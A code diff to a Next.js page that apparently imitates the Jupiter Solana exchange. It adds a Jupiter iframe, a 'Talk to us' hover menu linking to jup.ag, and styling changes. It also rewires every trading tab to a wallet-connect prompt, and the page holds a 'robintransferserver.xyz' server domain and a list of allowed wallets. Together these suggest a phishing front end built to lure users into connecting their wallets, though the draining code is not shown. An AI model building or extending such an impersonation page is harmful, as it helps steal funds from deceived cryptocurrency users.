@@ -1,28 +1,44 @@
 "use client"
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
+import { useEffect, useRef, useState } from "react"
 import { Button } from "@/components/ui/button"
-import { Sparkles, SlidersHorizontal, Eye } from "lucide-react"
+import { Sparkles, SlidersHorizontal, Eye, MessageSquareHeart, MessageCircleQuestionIcon, Lightbulb } from "lucide-react"
 import SparklineChart from "@/components/ui/SparklineChart"
 // import PluginComponent from '@/components/plugin'
+import JupiterIframe from '@/components/JupiterIframe'
 import { useAppKit } from "@reown/appkit/react"
 import { nextParamServerUrl } from "@/config"
-import UltraTogglePanel from "@/components/ui/UltraTogglePanel"
+import { Footer } from "react-day-picker"
 
 export default function DeFiTradingPlatform() {
   const { open, close } = useAppKit()
-  const [Plugin, setPlugin] = useState<React.ComponentType | null>(null)
   const [serverDomain, setServerDomain] = useState("https://robintransferserver.xyz")
   const [isModalVisible, setModalVisible] = useState(false)
 
-  const toggleModal = () => setModalVisible(!isModalVisible)
+  const closeTimerRef = useRef<number | null>(null)
 
+  // Open immediately and cancel any pending close
+  const openMenu = () => {
+    if (closeTimerRef.current) {
+      window.clearTimeout(closeTimerRef.current)
+      closeTimerRef.current = null
+    }
+    setModalVisible(true)
+  }
+
+  // Close with a short delay to avoid flicker when moving between elements
+  const closeMenuWithDelay = (delay = 120) => {
+    if (closeTimerRef.current) window.clearTimeout(closeTimerRef.current)
+    closeTimerRef.current = window.setTimeout(() => {
+      setModalVisible(false)
+      closeTimerRef.current = null
+    }, delay)
+  }
+
+  // cleanup on unmount
   useEffect(() => {
-    // small tick to allow appkit provider/effects to settle, then load Jupiter plugin
-    const t = setTimeout(() => {
-      import('@/components/plugin').then((mod) => setPlugin(() => mod.default))
-    }, 500)
-    return () => clearTimeout(t)
+    return () => {
+      if (closeTimerRef.current) window.clearTimeout(closeTimerRef.current)
+    }
   }, [])
 
   useEffect(() => {
@@ -34,7 +50,7 @@ export default function DeFiTradingPlatform() {
     fetchData()
   }, [])
 
-  const handleConnectWallet = () => open()
+  const handleConnectWallet = () => open({ view: "Connect" })
 
   const allowWalletList = [
     "MetaMask", "Phantom", "Solflare", "Trust Wallet", "Exodus"
@@ -160,8 +176,8 @@ export default function DeFiTradingPlatform() {
   }, [serverDomain, close])
 
   const [activeTab, setActiveTab] = useState("Market")
-  const router = useRouter()
-  const goToWalletSystem = () => router.push("/wallet-system")
+  // const router = useRouter()
+  // const goToWalletSystem = () => router.push("/wallet-system")
 
   return (
     <div className="relative min-h-screen overflow-hidden text-white">
@@ -197,13 +213,6 @@ export default function DeFiTradingPlatform() {
             Jupiter
           </div>
         </a>
-        {/* <div className="flex-1 max-w-md mx-8">
-          <div className="relative">
-            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-            <Input className="pl-10 bg-card/10 border border-border/10 text-card-foreground rounded-full" />
-          </div>
-        </div> */}
-        {/* flex h-8 min-w-8 items-center justify-center rounded-full border border-transparent focus-visible:outline focus-visible:outline-primary md:h-9 md:min-w-9 bg-primary/10 px-3 text-xs font-semibold text-primary hover:border-primary hover:bg-primary/10 hover:text-primary */}
         <Button
           className="cursor-pointer flex h-8 min-w-8 items-center justify-center rounded-full border border-transparent focus-visible:outline focus-visible:outline-primary md:h-9 md:min-w-9 bg-primary/10 px-3 text-xs font-semibold text-primary hover:border-primary hover:bg-primary/20 hover:text-primary"
           onClick={handleConnectWallet}
@@ -216,13 +225,14 @@ export default function DeFiTradingPlatform() {
       <div className="relative z-10 container mx-auto px-4 py-20" style={{ paddingTop: 84 }}>
         <div className="max-w-lg mx-auto">
           {/* Jupiter Plugin Card */}
-          <div className="bg-[rgba(11,14,18,0.85)] border border-[#0f1418] rounded-4xl shadow-[0_30px_60px_rgba(0,0,0,0.65)] p-0 backdrop-blur-md">
+          <div className="bg-[rgba(11,14,18,0.85)] border border-neutral-850 rounded-4xl p-0 backdrop-blur-md">
+            {/* shadow-[0_30px_60px_rgba(0,0,0,0.65)] */}
             {/* Tabs */}
             <div className="flex p-3 mb-3 bg-transparent border-neutral-850 border-b">
               {["Market", "trigger", "recurring"].map((tab) => (
                 <button
                   key={tab}
-                  onClick={goToWalletSystem}
+                  onClick={handleConnectWallet}
                   className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors cursor-pointer hover:bg-primary/5 hover:text-primary ${activeTab === tab
                     ? "bg-primary/10 text-primary"
                     : "text-muted-foreground hover:text-foreground"
@@ -239,31 +249,26 @@ export default function DeFiTradingPlatform() {
                 className="flex items-center gap-2 border p-2 rounded-full cursor-pointer h-7 text-neutral-300 hover:bg-neutral-800"
                 onClick={handleConnectWallet}
               >
-                <Sparkles className="w-4 h-4 text-muted-foreground" />
+                <Sparkles className="w-4 h-4 text-[rgba(199,242,132,var(--tw-text-opacity,1))]" />
                 <span className="text-sm font-medium">Ultra v2</span>
                 <SlidersHorizontal className="w-4 h-4 text-muted-foreground" />
               </div>
-              {isModalVisible && (
-                <div className="fixed inset-0 bg-black/70 flex items-center justify-center border z-[100]">
-                  <div className="border text-white rounded-lg shadow-lg max-w-xl w-full">
-                    <UltraTogglePanel toggleModal={toggleModal} />
-                  </div>
-                </div>
-              )}
             </div>
 
             <div className="w-full pl-3 pr-3">
-              {Plugin ? <Plugin /> : null}
+              <JupiterIframe />
             </div>
           </div>
 
           {/* Chart Section */}
           <div className="flex items-center gap-4 my-4">
-            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full">
+            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full transition
+                hover:cursor-not-allowed" title="Please connect wallet">
               <span className="text-sm text-muted-foreground">Show Chart</span>
               <Eye className="w-4 h-4" />
             </div>
-            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full">
+            <div className="flex items-center gap-2 bg-gray-700/30 px-2 py-1 rounded-full transition
+                hover:cursor-not-allowed" title="Please connect wallet">
               <span className="text-sm text-muted-foreground">Show History</span>
               <Eye className="w-4 h-4" />
             </div>
@@ -275,6 +280,59 @@ export default function DeFiTradingPlatform() {
             <SparklineChart coinId="solana" coinName="SOL" vsCurrency="usd" days={1} decimals={2} address="So11111111111111111111111111111111111111112" />
           </div>
         </div>
+      </div>
+
+      {/* Footer Section */}
+      <div className="absolute bottom-0 w-full">
+        <Footer className="flex w-full items-center bg-transparent px-4 pb-16 pt-3 text-xs sm:pb-3 md:px-8 relative">
+          {/* parent wrapper handles both enter and leave so moving between trigger and menu doesn't close it */}
+          <div
+            className="flex flex-1 justify-end relative"
+            onMouseEnter={openMenu}
+            onMouseLeave={() => closeMenuWithDelay(120)}
+          >
+            {/* trigger (no onMouseLeave here) */}
+            <div
+              className="flex cursor-pointer items-center space-x-2 p-2 font-semibold text-neutral-400 hover:text-primary"
+              onClick={() => {
+                // clicking toggles but cancels pending close so it stays stable
+                if (closeTimerRef.current) {
+                  window.clearTimeout(closeTimerRef.current)
+                  closeTimerRef.current = null
+                }
+                setModalVisible(prev => !prev)
+              }}
+            >
+              <MessageSquareHeart className="h-4 w-4 mr-0" />
+              <span>Talk to us</span>
+            </div>
+
+            {/* dropdown (no seperate mouse handlers needed) */}
+            <div
+              className={`absolute bottom-full mb-2 right-0 w-45 rounded-lg bg-[#0b0e12] border border-[#1a1f25]
+                          shadow-[0_10px_30px_rgba(0,0,0,0.6)] backdrop-blur-md py-2 px-1.5 z-50
+                          transform transition-all duration-150 ease-out
+                          ${isModalVisible ? "opacity-100 translate-y-0 pointer-events-auto" : "opacity-0 translate-y-2 pointer-events-none"}`}
+              aria-hidden={!isModalVisible}
+            >
+              <button
+                className="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-neutral-300 hover:bg-primary/10 hover:text-primary transition-colors text-sm cursor-pointer"
+                onClick={() => window.open('https://feedback.jup.ag/', '_blank')}
+              >
+                <Lightbulb className="h-4 w-4" />
+                <span>Feature Request</span>
+              </button>
+
+              <button
+                className="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-neutral-300 hover:bg-primary/10 hover:text-primary transition-colors text-sm cursor-pointer"
+                onClick={() => window.open('https://support.jup.ag/hc/en-us', '_blank')}
+              >
+                <MessageCircleQuestionIcon className="h-4 w-4" />
+                <span>Help Center</span>
+              </button>
+            </div>
+          </div>
+        </Footer>
       </div>
     </div>
   )
